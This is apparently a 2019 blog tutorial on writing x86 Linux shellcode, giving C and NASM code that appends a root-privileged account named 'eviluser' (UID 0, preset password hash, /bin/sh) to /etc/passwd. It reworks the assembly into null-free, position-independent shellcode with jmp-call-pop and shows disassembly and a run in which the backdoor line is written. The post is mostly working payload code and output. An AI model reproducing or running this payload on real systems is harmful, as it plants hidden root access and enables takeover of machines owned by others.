---
layout: post
title:	"x86 Assembly #4: useradd shellcode"
date:	2019-06-24 00:00:00
categories:
    - blog
tags:
    - linux
    - nasm
    - x86
    - objdump
    - ld
    - shellcode
---
## Introduction
Today we're going to write some shellcode,which adds new user to a linux OS. Our plan is following:
 - `C` code which adds new user.
   - Explain `open()` and `write()` syscalls
 - `asm` code which adds new user.
 - Convert assembly code into `opcode` bytes which fits in shellcode format.



## useradd.c
{% highlight C %}
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>

int main()
{
        int fd;
        char *newuser = "eviluser:$1$xyz$qpXht651W6vzmblmv2oKj/:0:0::/dev/null:/bin/sh\n";
        fd = open("/etc/passwd", O_WRONLY | O_APPEND);
        write(fd, newuser, strlen(newuser));
        close(fd);
}
{% endhighlight %}

`fd` variable holds `/etc/passwd` file descriptor. We call two functions: `open()` and `write()`. Their prototypes are:
~~~
int open(const char *pathname, int flags);
ssize_t write(int fd, const void *buf, size_t count);
~~~
`open` syscall takes 2 parameters: <br>
        - pathname: file to open <br>
        - flags: mode in which files are going to be opened <br>
`write` syscall takes 3 parameters: <br>
        - fd: integer value returned from `open()` syscall <br>
        - buf: pointer value that points to buffer,which is gonna be written to destination file <br>
        - count: how many bytes to write <br>

Compiling:
~~~
$ gcc -o useradd useradd.c
$ cat /etc/passwd
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
eviluser:$1$xyz$qpXht651W6vzmblmv2oKj/:0:0::/dev/null:/bin/sh
~~~

## adduser.asm
{% highlight nasm %}
; Adds new user to /etc/passwd with root id
global _start

section .text
_start:
        ; int open(const char *pathname, int flags)
        ; ssize_t write(int fd, const void *buf, size_t count)
        ; write - 4
        ; open - 5

        ; call open
        mov eax, 0x5
        mov ebx, filename
        mov ecx, 0x401
        int 0x80
        mov esi,eax ; save file descriptor

        ; call write
        xor eax,eax
        mov eax,0x4
        mov ebx,esi
        mov ecx,newuser
        mov edx,len
        int 0x80

        ; call exit(0)
        xor eax,eax
        mov eax,0x1
        mov ebx,0x0
        int 0x80
section .data
        newuser: db "eviluser:$1$xyz$qpXht651W6vzmblmv2oKj/:0:0::/dev/null:/bin/sh", 0x0a
        len equ $-newuser
        filename: db "/etc/passwd"
{% endhighlight %}

Compiling and Linking:
~~~
root@ubuntu:~/user-add-shlc# nasm -f elf32 useradd.asm -o useradd.o                                               
root@ubuntu:~/user-add-shlc# ld -o useradd useradd.o
~~~

So, we have working C and asm source codes. In order to create shellcode out of assembly code we need to address following issues:
 - `data` section exists, which we don't want.
 - NULL bytes

Let's get hex bytes of generated binary file:
~~~
root@ubuntu:~/user-add-shlc# objdump -d ./useradd -M intel

./useradd:     file format elf32-i386


Disassembly of section .text:

08048080 <_start>:
 8048080:       b8 05 00 00 00          mov    eax,0x5
 8048085:       bb f6 90 04 08          mov    ebx,0x80490f6  ; static address we need to get rid of
 804808a:       b9 01 04 00 00          mov    ecx,0x401
 804808f:       cd 80                   int    0x80
 8048091:       89 c6                   mov    esi,eax
 8048093:       31 c0                   xor    eax,eax
 8048095:       b8 04 00 00 00          mov    eax,0x4
 804809a:       89 f3                   mov    ebx,esi
 804809c:       b9 b8 90 04 08          mov    ecx,0x80490b8  ; static address we need to get rid of
 80480a1:       ba 3e 00 00 00          mov    edx,0x3e
 80480a6:       cd 80                   int    0x80
 80480a8:       31 c0                   xor    eax,eax
 80480aa:       b8 01 00 00 00          mov    eax,0x1
 80480af:       bb 00 00 00 00          mov    ebx,0x0
 80480b4:       cd 80                   int    0x80
~~~

So, we need to do following things,e.g:
~~~
mov eax,0x5  +--------->   mov al,0x5
mov ebx,0x0  +--------->   xor ebx,ebx
~~~
{% highlight nasm %}
; Adds new user to /etc/passwd with root id
global _start

section .text
_start:
        ; int open(const char *pathname, int flags)
        ; ssize_t write(int fd, const void *buf, size_t count)
        ; write - 4
        ; open - 5

        ; call open
        mov al, 0x5
        mov ebx, filename
        mov cx, 0x401
        int 0x80
        mov esi,eax ; save file descriptor

        ; call write
        xor eax,eax
        mov al,0x4
        mov ebx,esi
        mov ecx,newuser
        mov dl,len
        int 0x80

        ; call exit(0)
        xor eax,eax
        mov al,0x1
        xor ebx,ebx
        int 0x80
section .data
        newuser: db "eviluser:$1$xyz$qpXht651W6vzmblmv2oKj/:0:0::/dev/null:/bin/sh", 0x0a
        len equ $-newuser
        filename: db "/etc/passwd"
{% endhighlight %}

So far we have this NULL free hex bytes:
~~~
root@ubuntu:~/user-add-shlc# objdump -d useradd2 -M intel                                                          

useradd2:     file format elf32-i386


Disassembly of section .text:

08048080 <_start>:
 8048080:       b0 05                   mov    al,0x5
 8048082:       bb e6 90 04 08          mov    ebx,0x80490e6
 8048087:       66 b9 01 04             mov    cx,0x401
 804808b:       cd 80                   int    0x80
 804808d:       89 c6                   mov    esi,eax
 804808f:       31 c0                   xor    eax,eax
 8048091:       b0 04                   mov    al,0x4
 8048093:       89 f3                   mov    ebx,esi
 8048095:       b9 a8 90 04 08          mov    ecx,0x80490a8
 804809a:       b2 3e                   mov    dl,0x3e
 804809c:       cd 80                   int    0x80
 804809e:       31 c0                   xor    eax,eax
 80480a0:       b0 01                   mov    al,0x1
 80480a2:       31 db                   xor    ebx,ebx
 80480a4:       cd 80                   int    0x80
root@ubuntu:~/user-add-shlc# 
~~~

Static addresses are problem for us, because when shellcode is inserted into memory this static addresses doesn't exist. We need somehow address this issue via `jmp - call - pop` technique
{% highlight nasm %}
; Adds new user to /etc/passwd with root id
global _start

section .text
_start:
        ; int open(const char *pathname, int flags)
        ; ssize_t write(int fd, const void *buf, size_t count)
        ; write - 4
        ; open - 5

        ; call open
        mov eax, 0x5
        jmp filename
back_filename:
        pop ebx
        mov ecx, 0x401
        int 0x80
        mov esi,eax ; save file descriptor

        ; call write
        xor eax,eax
        mov eax,0x4
        mov ebx,esi
        jmp newuser
back_newuser:
        ; calculate length and put in edx register
        call calculate_len
        mov edx,esi
        int 0x80

        ; call exit(0)
        xor eax,eax
        mov eax,0x1
        mov ebx,0x0
        int 0x80

newuser:
        call back_newuser
        db "eviluser:$1$xyz$qpXht651W6vzmblmv2oKj/:0:0::/dev/null:/bin/sh",0x0a,0x00
filename:
        call back_filename 
        db "/etc/passwd",0x00

calculate_len:
        xor ecx, ecx
        xor esi, esi
        mov ecx, [esp+0x4]   ; ecx -> "lasha"
loop:
        cmp byte [ecx], 0x00
        jne increment
        jmp exit

increment:
        inc ecx
        inc esi
        jmp loop

exit:
        mov ecx,[esp+0x4]
        ret
{% endhighlight %}

This assembly code is a bit long and maybe wrong in some places and needs optimization BUT in works :)
~~~
root@ubuntu:~/user-add-shlc# vim useradd4.asm 
root@ubuntu:~/user-add-shlc# nasm -f elf32 useradd4.asm -o useradd4.o
root@ubuntu:~/user-add-shlc# ld useradd4.o -o useradd4
root@ubuntu:~/user-add-shlc# ./useradd4 
root@ubuntu:~/user-add-shlc# cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:110::/var/run/dbus:/bin/false
uuidd:x:107:111::/run/uuidd:/bin/false
higgsx:x:1000:1000:higgsx,,,:/home/higgsx:/bin/bash
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
eviluser:$1$xyz$qpXht651W6vzmblmv2oKj/:0:0::/dev/null:/bin/sh
eviluser:$1$xyz$qpXht651W6vzmblmv2oKj/:0:0::/dev/null:/bin/sh
root@ubuntu:~/user-add-shlc# 
~~~